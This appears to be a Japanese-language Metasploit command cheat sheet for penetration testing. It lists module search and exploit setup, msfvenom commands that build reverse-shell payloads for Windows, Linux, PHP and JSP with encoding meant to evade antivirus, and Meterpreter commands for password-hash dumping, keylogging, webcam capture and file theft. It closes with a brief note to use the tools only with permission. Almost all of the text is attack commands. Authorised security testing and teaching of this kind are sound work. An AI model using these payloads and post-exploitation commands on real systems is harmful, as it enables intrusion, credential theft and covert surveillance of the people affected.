# Metasploit Framework Command Reference

## 基本操作
```bash
# Metasploitの起動
msfconsole

# データベース初期化
msfdb init

# ワークスペース管理
workspace -a <name>    # ワークスペース追加
workspace -d <name>    # ワークスペース削除
workspace -l          # ワークスペース一覧
```

## 情報収集
```bash
# モジュール検索
search <keyword>
search type:exploit platform:windows
search type:exploit name:apache

# モジュール情報表示
info <module_path>

# ターゲットリスト表示
show targets
```

## エクスプロイト実行
```bash
# モジュール選択
use <module_path>

# オプション設定
show options
set RHOSTS <target>
set LHOST <attacker>
set LPORT <port>
setg RHOSTS <target>  # グローバル設定

# エクスプロイト実行
exploit
run
check
```

## ペイロード生成
```bash
# Windows実行ファイル
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=<port> -f exe > payload.exe

# Linux実行ファイル
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker> LPORT=<port> -f elf > payload.elf

# Webペイロード
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker> LPORT=<port> -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f raw > shell.jsp

# エンコード
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=<attacker> LPORT=<port> -f exe > encoded.exe
```

## Meterpreterコマンド
```bash
# システム情報
sysinfo          # システム情報表示
getuid           # 現在のユーザー表示
getprivs         # 現在の権限表示
ps               # プロセス一覧

# ファイル操作
pwd              # 現在のディレクトリ表示
ls               # ファイル一覧
cd <directory>   # ディレクトリ移動
download <file>  # ファイルダウンロード
upload <file>    # ファイルアップロード
cat <file>       # ファイル内容表示

# システム操作
shell            # システムシェル取得
migrate <pid>    # プロセス移行
hashdump         # パスワードハッシュ取得
screenshot       # スクリーンショット取得
webcam_snap      # Webカメラ撮影
keyscan_start    # キーロガー開始
keyscan_dump     # キーログ取得
```

## セッション管理
```bash
# セッション操作
sessions -l      # セッション一覧
sessions -i <id> # セッション切り替え
sessions -k <id> # セッション終了
background       # セッションをバックグラウンド化

# ルーティング
route add <subnet> <netmask> <sid>
route print
```

## データベース操作
```bash
# ホスト管理
hosts -a <address>    # ホスト追加
hosts -d <address>    # ホスト削除
hosts                 # ホスト一覧

# サービス管理
services -a <name>    # サービス追加
services -p <port>    # ポートでフィルタ
services             # サービス一覧
```

## 注意事項
- これらのツールは許可された環境でのみ使用してください
- マルウェアの生成と使用は違法となる可能性があります
- 実環境での使用は必ず許可を得てから行ってください
- アンチウイルスソフトに検知される可能性があります 